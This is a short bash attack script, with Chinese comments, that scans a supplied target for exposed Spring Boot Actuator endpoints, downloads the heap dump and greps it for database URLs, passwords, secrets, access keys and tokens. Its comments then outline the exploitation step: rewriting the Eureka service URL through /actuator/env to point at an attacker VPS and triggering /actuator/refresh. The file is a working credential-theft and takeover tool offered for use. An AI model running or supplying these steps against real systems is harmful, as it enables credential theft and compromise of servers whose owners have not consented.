#!/usr/bin/env bash
TARGET="${1:?usage: bash actuator.sh http://TARGET:8080}"
B="${TARGET%/}"
for p in /actuator /actuator/env /actuator/heapdump /actuator/mappings /actuator/httptrace /env /heapdump; do
  printf '%-24s ' "$p"; curl -sS -m 10 -o /dev/null -w '%{http_code} %{size_download}\n' "$B$p"
done
# heapdump 里捞凭据（拉下来再 strings，别在目标上跑工具）
curl -sS -m 120 -o runs/heap.hprof "$B/actuator/heapdump"
strings runs/heap.hprof 2>/dev/null | grep -iE 'jdbc:|password|secret|accessKey|token' | head -20
# env 改写（Spring Cloud + refresh 才有效，属利用阶段）
#   POST /actuator/env  {"name":"eureka.client.serviceUrl.defaultZone","value":"http://<VPS>:8761/eureka/"}
#   POST /actuator/refresh
# 判定：heapdump 里出现明文口令 = 凭据泄露（可直接记 db-credential）
